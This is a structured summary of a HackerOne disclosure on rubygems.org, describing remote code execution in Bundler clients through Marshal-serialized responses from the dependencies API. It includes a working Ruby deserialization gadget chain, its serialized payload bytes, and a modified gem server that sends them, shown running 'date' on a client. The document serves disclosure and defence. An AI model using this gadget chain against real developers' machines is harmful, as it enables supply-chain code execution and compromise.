# Remote Code Execution via Marshal.dump in Bundler Dependencies API

## Metadata
- **Source:** HackerOne
- **Report:** 1119120 | https://hackerone.com/reports/1119120
- **Submitted:** 2021-03-07
- **Reporter:** ooooooo_q
- **Program:** rubygems.org
- **Bounty:** Not specified in writeup
- **Severity:** Critical
- **Vuln:** Unsafe Deserialization, Remote Code Execution, CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **CVEs:** None
- **Category:** memory-binary

## Summary
The GET /api/v1/dependencies endpoint in rubygems.org responds with Marshal.dump serialized data instead of JSON, allowing unauthenticated remote code execution on Bundler clients. Ruby's Marshal format is known to be vulnerable to deserialization gadget chains that enable arbitrary code execution when Marshal.load is called on untrusted data.

## Attack scenario
1. Attacker controls or performs MITM on a gem source server (via DNS spoofing, BGP hijacking, or network compromise)
2. Bundler client requests dependency metadata from the attacker-controlled source using GET /api/v1/dependencies
3. Attacker responds with HTTP 200 and Content-Type: application/x-marshal containing a malicious Marshal payload
4. Bundler's Gem::StubSpecification or similar code automatically calls Marshal.load on the response
5. Universal RCE gadget chain (Gem::RequestSet → Net::WriteAdapter → Kernel.system) triggers arbitrary command execution
6. Attacker gains code execution with the privileges of the user running bundle install

## Root cause
The dependencies controller explicitly supports Marshal format responses via `format.marshal { render plain: Marshal.dump(deps) }`. Ruby's Marshal format was never designed for untrusted input and enables arbitrary code execution through object instantiation and method invocation gadget chains. The endpoint should only support JSON responses for untrusted clients.

## Attacker mindset
An attacker would target developers who configure private gem sources or use alternative gem repositories. By poisoning gem source responses, they achieve pre-authentication RCE affecting any developer using Bundler with that source. The attack is particularly effective because it targets the dependency resolution phase before any gems are verified or executed.

## Defensive takeaways
- Never use Marshal.load/deserialize on untrusted data from network sources
- Restrict response formats to safe serialization methods (JSON, MessagePack with limited classes)
- Implement cryptographic verification (GPG signatures) for dependency metadata
- Use certificate pinning or strict HTTPS validation for gem source URLs
- Only support HTTPS (not HTTP) for dependency API endpoints
- Whitelist allowed Gem classes during deserialization if Marshal must be used
- Implement code signing and verification for all gem metadata responses
- Monitor and log unusual gem source configurations or metadata requests

## Variant hunting
Check other package managers (pip, npm, cargo) for similar Marshal-like unsafe deserialization endpoints
Search for other .marshal format handlers in Ruby web applications
Audit all endpoints accepting format parameters for unsafe serialization methods
Test private gem source implementations (Nexus, Artifactory) for similar issues
Review Bundler's handling of Content-Type headers for gem source responses
Investigate if other Gem::* classes expose exploitable gadget chains
Check if bundler-audit or similar tools can detect unsafe gem source configurations

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1195 - Supply Chain Compromise
- T1195.001 - Compromise Software Supply Chain
- T1565.002 - Authorized Information Deletion
- T1104 - Multi-Stage Channels
- T1059 - Command and Scripting Interpreter
- T1203 - Exploitation for Client Execution

## Notes
This vulnerability affects the entire Ruby ecosystem's dependency resolution. The PoC demonstrates a working RCE using the universal gadget chain from devcraft.io. The writeup shows bundler automatically processes marshal responses from the /api/v1/dependencies endpoint. rubygems.org should disable Marshal format support entirely for this endpoint. Users should only configure HTTPS gem sources and validate their integrity. The vulnerability requires either a compromised gem source or MITM capability, but both are realistic in enterprise environments with corporate proxies or APT-level attackers.

## Full report
<details><summary>Expand</summary>

In `GET /api/v1/dependencies`, which Bundler uses to check dependencies, the response is `Marshal.dump` instead of `JSON`.

https://github.com/rubygems/rubygems.org/blob/a6f78a01598592083850f15e262bbc09a85b0a70/app/controllers/api/v1/dependencies_controller.rb#L12

```ruby
    respond_to do |format|
      format.json { render json: deps }
      format.marshal { render plain: Marshal.dump(deps) }
    end
```

According to the [Universal Deserialisation Gadget for Ruby 2.x-3.x](https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) article, Marshal.load can be RCE.
Therefore, RCE is possible for the client that receives the specially crafted response.


### Poc

#### Prepare attack code

Prepare code to run `date`

```ruby
# Universal Deserialisation Gadget for Ruby 2.x-3.x
# https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

# Autoload the required classes
Gem::SpecFetcher
Gem::Installer

# prevent the payload from running when we Marshal.dump it
module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

wa1 = Net::WriteAdapter.new(Kernel, :system)

rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', "date") # for run `date`

wa2 = Net::WriteAdapter.new(rs, :resolve)

i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")


n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)

t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)

r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
puts payload.inspect
```

```
❯ ruby create_rce.rb
"\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI\"\baaa\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r@git_setI\"\tdate\x06;\fT;\x12:\fresolve"
```

#### Prepare evil server

Prepare a server to work on the response.
I created it based on [geminabox](https://github.com/geminabox/geminabox).

```ruby
# geminabox/geminabox/lib/geminabox/server.rb
    get '/api/v1/dependencies' do
      attack = "\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI\"\baaa\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r@git_setI\"\tdate\x06;\fT;\x12:\fresolve"
      query_gems.any? ? attack : 200
    end
```

```
❯ RUBYGEMS_PROXY=true rackup
Puma starting in single mode...
* Puma version: 5.2.2 (ruby 2.7.1-p83) ("Fettisdagsbulle")
*  Min threads: 0
*  Max threads: 5
*  Environment: development
*          PID: 22469
* Listening on http://127.0.0.1:9292
* Listening on http://[::1]:9292
```

### Use evil sever

```
❯ bundle -v
Bundler version 2.2.13

❯ bundle init

# Use evil server for source
❯ cat Gemfile
# frozen_string_literal: true

# source "https://rubygems.org"
source "http://127.0.0.1:9292"

gem "json"
```

```
# `date` runs on the client
❯ bundle install
Fetching gem metadata from http://127.0.0.1:9292/.sh: reading: command not found
2021年 3月 7日 日曜日 15時44分43秒 JST

Retrying dependency api due to error (2/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String
sh: reading: command not found
2021年 3月 7日 日曜日 15時44分43秒 JST

Retrying dependency api due to error (3/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String
sh: reading: command not found
2021年 3月 7日 日曜日 15時44分44秒 JST

Retrying dependency api due to error (4/4): Bundler::MarshalError TypeError: no implicit conversion of nil into String
sh: reading: command not found
2021年 3月 7日 日曜日 15時44分44秒 JST
```

## Impact

Of course, there is a danger in specifying an untrusted `source` and in the possibility of a man-in-the-middle attack. This endpoint using marshal increases that risk.

</details>

---
*Analysed by Claude on 2026-05-12*
